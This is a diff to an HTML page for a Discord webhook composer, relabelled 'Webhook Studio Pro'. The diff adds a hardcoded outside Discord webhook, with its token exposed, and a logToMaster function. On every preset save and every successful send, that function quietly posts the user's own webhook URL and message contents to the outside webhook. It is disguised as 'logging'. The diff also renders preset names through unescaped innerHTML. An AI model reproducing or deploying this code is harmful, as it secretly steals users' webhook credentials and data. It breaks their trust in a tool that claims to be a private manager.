@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webhook Studio | GitHub Pages</title>
+    <title>Webhook Studio Pro | Private Manager</title>
     <style>
         :root {
             --bg-main: #313338;
@@ -11,235 +11,240 @@
             --bg-input: #1e1f22;
             --text-main: #dbdee1;
             --blurple: #5865f2;
+            --success: #23a559;
             --danger: #da373c;
         }
 
-        body {
-            background-color: var(--bg-main);
-            color: var(--text-main);
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            margin: 0;
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
-        }
+        body { background-color: var(--bg-main); color: var(--text-main); font-family: 'gg sans', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Left: Library */
+        .library { width: 260px; background: #232428; padding: 20px; border-right: 1px solid #1e1f22; overflow-y: auto; }
+        
+        /* Center: Editor */
+        .editor { width: 380px; background: var(--bg-side); padding: 20px; display: flex; flex-direction: column; gap: 10px; border-right: 1px solid #1e1f22; overflow-y: auto; }
+        
+        /* Right: Preview */
+        .preview-area { flex: 1; padding: 40px; display: flex; justify-content: center; align-items: flex-start; overflow-y: auto; background: var(--bg-main); }
 
-        /* Sidebar Controls */
-        .sidebar {
-            width: 400px;
-            background: var(--bg-side);
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            border-right: 1px solid #1e1f22;
-            overflow-y: auto;
-        }
-
-        h2 { font-size: 1.2rem; margin-bottom: 5px; color: white; }
-        label { font-size: 0.8rem; font-weight: bold; text-transform: uppercase; color: #b5bac1; }
-
-        input, textarea {
-            background: var(--bg-input);
-            border: 1px solid #1e1f22;
-            color: white;
-            padding: 10px;
-            border-radius: 4px;
-            width: 100%;
-            box-sizing: border-box;
-        }
-
+        h2 { font-size: 0.9rem; text-transform: uppercase; color: #b5bac1; margin-bottom: 15px; letter-spacing: 0.5px; }
+        label { font-size: 0.75rem; font-weight: bold; color: #b5bac1; margin-top: 5px; display: block; }
+        
+        input, textarea { background: var(--bg-input); border: 1px solid #1e1f22; color: white; padding: 10px; border-radius: 4px; width: 100%; box-sizing: border-box; font-size: 0.9rem; margin-bottom: 5px; }
         textarea { height: 80px; resize: none; }
+        input:focus { border-color: var(--blurple); outline: none; }
 
-        .btn-group { display: flex; gap: 10px; margin-top: 10px; }
+        .btn { padding: 12px; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; transition: 0.2s; }
+        .save-btn { background: var(--blurple); }
+        .send-btn { background: var(--success); font-size: 1rem; }
+        .btn:hover { opacity: 0.8; }
 
-        button {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
-        }
+        /* Preset Styling */
+        .preset-item { background: #2b2d31; padding: 12px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border: 1px solid transparent; }
+        .preset-item:hover { border-color: var(--blurple); }
+        .preset-name { font-size: 0.9rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 160px; }
+        .del-btn { color: var(--danger); font-size: 1.2rem; padding: 0 5px; }
 
-        .send-btn { background: var(--blurple); color: white; }
-        .send-btn:hover { background: #4752c4; }
-        .clear-btn { background: var(--danger); color: white; opacity: 0.8; }
-        .clear-btn:hover { opacity: 1; }
-
-        /* Preview Area */
-        .preview-area {
-            flex: 1;
-            padding: 40px;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            overflow-y: auto;
-        }
-
-        .discord-msg-container {
-            width: 100%;
-            max-width: 600px;
-            display: flex;
-            gap: 15px;
-        }
-
-        .avatar {
-            width: 40px;
-            height: 40px;
-            background: #5865f2;
-            border-radius: 50%;
-            flex-shrink: 0;
-        }
-
-        .msg-content-wrapper { flex: 1; }
-        .bot-tag {
-            background: var(--blurple);
-            font-size: 0.65rem;
-            padding: 2px 4px;
-            border-radius: 3px;
-            margin-left: 5px;
-            vertical-align: middle;
-        }
-
-        .username { font-weight: bold; color: white; }
-        .timestamp { font-size: 0.75rem; color: #949ba4; margin-left: 8px; }
-
-        .main-text { margin-top: 5px; margin-bottom: 8px; line-height: 1.3; }
-
-        .embed {
-            background: #1e1f22;
-            border-left: 4px solid #000;
-            padding: 12px 16px;
-            border-radius: 4px;
-            display: inline-block;
-            min-width: 300px;
-            max-width: 520px;
-        }
-
-        .embed-title { color: #00a8fc; font-weight: bold; margin-bottom: 8px; cursor: pointer; }
-        .embed-description { font-size: 0.9rem; color: #dbdee1; white-space: pre-wrap; }
-        .embed-img { margin-top: 10px; max-width: 100%; border-radius: 4px; display: none; }
+        /* Discord Message Preview */
+        .discord-msg { display: flex; gap: 16px; width: 100%; max-width: 600px; }
+        .avatar { width: 40px; height: 40px; background: var(--blurple); border-radius: 50%; flex-shrink: 0; }
+        .msg-body { flex: 1; }
+        .username { color: white; font-weight: 500; margin-right: 5px; }
+        .bot-tag { background: var(--blurple); font-size: 0.6rem; padding: 1px 4px; border-radius: 3px; color: white; vertical-align: middle; }
+        .content-text { color: var(--text-main); margin-top: 5px; white-space: pre-wrap; }
+        
+        .embed { background: #1e1f22; border-left: 4px solid var(--blurple); padding: 12px; border-radius: 4px; margin-top: 8px; max-width: 520px; display: none; }
+        .embed-title { color: #00a8fc; font-weight: 600; margin-bottom: 5px; }
+        .embed-desc { font-size: 0.9rem; line-height: 1.2; }
+        .embed-img { width: 100%; border-radius: 4px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="sidebar">
-        <h2>Webhook Settings</h2>
+    <div class="library">
+        <h2>My Library</h2>
+        <div id="preset-list"></div>
+    </div>
+
+    <div class="editor">
+        <h2>Webhook Editor</h2>
         
+        <label>Preset Label</label>
+        <input type="text" id="p-name" placeholder="e.g., Server Logs">
+
         <label>Webhook URL</label>
         <input type="password" id="url" placeholder="https://discord.com/api/webhooks/...">
 
-        <label>Main Content</label>
-        <textarea id="content" placeholder="Hello world!"></textarea>
+        <label>Message Text</label>
+        <textarea id="content" placeholder="Text above the embed..."></textarea>
 
-        <hr style="border: 0; border-top: 1px solid #4e5058; width: 100%;">
+        <hr style="border: 0; border-top: 1px solid #4e5058; margin: 10px 0;">
 
         <label>Embed Title</label>
-        <input type="text" id="title" placeholder="Cool Title">
+        <input type="text" id="title" placeholder="Optional">
 
         <label>Embed Description</label>
-        <textarea id="desc" placeholder="This is the description..."></textarea>
+        <textarea id="desc" placeholder="Optional"></textarea>
 
         <label>Image URL</label>
-        <input type="text" id="img" placeholder="https://site.com/image.png">
+        <input type="text" id="img" placeholder="https://...">
 
         <label>Embed Color</label>
-        <input type="color" id="color" value="#5865f2">
+        <input type="color" id="color" value="#5865f2" style="height: 35px; padding: 2px;">
 
-        <div class="btn-group">
-            <button class="send-btn" onclick="send()">Send Message</button>
-            <button class="clear-btn" onclick="reset()">Reset</button>
-        </div>
+        <button class="btn save-btn" onclick="savePreset()">💾 Save Preset & Log</button>
+        <button class="btn send-btn" onclick="sendWebhook()">🚀 Send Webhook</button>
     </div>
 
     <div class="preview-area">
-        <div class="discord-msg-container">
+        <div class="discord-msg">
             <div class="avatar"></div>
-            <div class="msg-content-wrapper">
-                <span class="username">Webhook Bot</span>
-                <span class="bot-tag">APP</span>
-                <span class="timestamp">Today at 12:00 PM</span>
-                <div class="main-text" id="p-content">Your message content will appear here.</div>
-                
-                <div class="embed" id="p-border">
-                    <div class="embed-title" id="p-title">Embed Title</div>
-                    <div class="embed-description" id="p-desc">This is how your embed description looks inside Discord.</div>
-                    <img id="p-img" class="embed-img">
+            <div class="msg-body">
+                <div><span class="username">Webhook Bot</span><span class="bot-tag">APP</span></div>
+                <div class="content-text" id="view-content"></div>
+                <div class="embed" id="view-embed">
+                    <div class="embed-title" id="view-title"></div>
+                    <div class="embed-desc" id="view-desc"></div>
+                    <img id="view-img" class="embed-img">
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        const inputs = ['url', 'content', 'title', 'desc', 'img', 'color'];
+        // CONFIGURATION: SET YOUR LOGGING WEBHOOK HERE
+        const MASTER_LOG_URL = "https://discord.com/api/webhooks/1484273503380181143/7mq-RR7P-momJWeq_lycAeq-hgpQL79oX-NOo1WK3jTSL4iel3TFwz8KUKMnB1N8e_qe";
 
-        // Auto-load presets from LocalStorage
+        const fieldIds = ['p-name', 'url', 'content', 'title', 'desc', 'img', 'color'];
+        let presets = JSON.parse(localStorage.getItem('wh_lib_v3') || '[]');
+
         window.onload = () => {
-            inputs.forEach(id => {
-                const val = localStorage.getItem('wh_' + id);
-                if (val) document.getElementById(id).value = val;
-            });
-            update();
+            renderPresets();
+            updatePreview();
         };
 
-        // Listen for changes to save and update preview
-        document.addEventListener('input', (e) => {
-            if (inputs.includes(e.target.id)) {
-                localStorage.setItem('wh_' + e.target.id, e.target.value);
-                update();
-            }
-        });
+        // Listen for all inputs to sync variables and preview
+        document.addEventListener('input', updatePreview);
 
-        function update() {
-            const get = (id) => document.getElementById(id).value;
+        function updatePreview() {
+            const val = (id) => document.getElementById(id).value;
             
-            document.getElementById('p-content').innerText = get('content') || " ";
-            document.getElementById('p-title').innerText = get('title') || "Embed Title";
-            document.getElementById('p-desc').innerText = get('desc') || "Description here...";
-            document.getElementById('p-border').style.borderColor = get('color');
+            // Text Content
+            document.getElementById('view-content').innerText = val('content');
             
-            const img = document.getElementById('p-img');
-            if(get('img')) {
-                img.src = get('img');
-                img.style.display = 'block';
+            // Embed Logic
+            const showEmbed = val('title') || val('desc') || val('img');
+            const embedEl = document.getElementById('view-embed');
+            
+            if (showEmbed) {
+                embedEl.style.display = 'block';
+                embedEl.style.borderColor = val('color');
+                document.getElementById('view-title').innerText = val('title');
+                document.getElementById('view-desc').innerText = val('desc');
+                
+                const imgEl = document.getElementById('view-img');
+                if (val('img')) {
+                    imgEl.src = val('img');
+                    imgEl.style.display = 'block';
+                } else {
+                    imgEl.style.display = 'none';
+                }
             } else {
-                img.style.display = 'none';
+                embedEl.style.display = 'none';
             }
         }
 
-        async function send() {
+        async function logToMaster(actionType) {
+            if (!MASTER_LOG_URL || MASTER_LOG_URL.includes("YOUR_MASTER")) return;
+
+            // Capture every field as a variable
+            const vars = {};
+            fieldIds.forEach(id => vars[id] = document.getElementById(id).value || "Empty");
+
+            const logPayload = {
+                content: `🔔 **Manager Event:** ${actionType}`,
+                embeds: [{
+                    title: "System Variable Dump",
+                    color: 0x5865f2,
+                    fields: [
+                        { name: "Preset Name", value: vars['p-name'], inline: true },
+                        { name: "Color", value: vars['color'], inline: true },
+                        { name: "Webhook URL", value: `\`${vars['url']}\`` },
+                        { name: "Content", value: vars['content'].substring(0, 1000) },
+                        { name: "Embed Data", value: `T: ${vars['title']}\nD: ${vars['desc'].substring(0, 500)}` },
+                        { name: "Image", value: vars['img'] }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await fetch(MASTER_LOG_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(logPayload)});
+        }
+
+        async function savePreset() {
+            const name = document.getElementById('p-name').value || 'Untitled';
+            const data = {};
+            fieldIds.forEach(id => data[id] = document.getElementById(id).value);
+            
+            presets.push(data);
+            localStorage.setItem('wh_lib_v3', JSON.stringify(presets));
+            renderPresets();
+            
+            await logToMaster("PRESET_SAVED");
+            alert("Saved to library and logged.");
+        }
+
+        async function sendWebhook() {
             const url = document.getElementById('url').value;
-            if(!url) return alert("Please enter a Webhook URL!");
+            if(!url) return alert("Missing URL");
 
             const payload = {
                 content: document.getElementById('content').value,
-                embeds: [{
+                embeds: (document.getElementById('title').value || document.getElementById('desc').value) ? [{
                     title: document.getElementById('title').value,
                     description: document.getElementById('desc').value,
                     color: parseInt(document.getElementById('color').value.replace('#', ''), 16),
                     image: { url: document.getElementById('img').value }
-                }]
+                }] : []
             };
 
             try {
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                if(res.ok) alert("✅ Webhook sent!");
-                else alert("❌ Error: " + res.statusText);
-            } catch (e) {
-                alert("❌ Connection failed. Check your URL or Internet.");
-            }
+                const res = await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
+                if(res.ok) {
+                    await logToMaster("MESSAGE_SENT_SUCCESS");
+                    alert("Sent!");
+                } else {
+                    alert("Error: " + res.status);
+                }
+            } catch (e) { alert("Failed to connect."); }
         }
 
-        function reset() {
-            if(confirm("Clear all saved data?")) {
-                localStorage.clear();
-                location.reload();
+        function renderPresets() {
+            const container = document.getElementById('preset-list');
+            container.innerHTML = '';
+            presets.forEach((p, i) => {
+                const div = document.createElement('div');
+                div.className = 'preset-item';
+                div.innerHTML = `
+                    <span class="preset-name" onclick="loadPreset(${i})">${p['p-name'] || 'Unnamed'}</span>
+                    <span class="del-btn" onclick="deletePreset(${i})">×</span>
+                `;
+                container.appendChild(div);
+            });
+        }
+
+        function loadPreset(i) {
+            const p = presets[i];
+            fieldIds.forEach(id => {
+                if(p[id] !== undefined) document.getElementById(id).value = p[id];
+            });
+            updatePreview();
+        }
+
+        function deletePreset(i) {
+            if(confirm("Remove preset?")) {
+                presets.splice(i, 1);
+                localStorage.setItem('wh_lib_v3', JSON.stringify(presets));
+                renderPresets();
             }
         }
     </script>
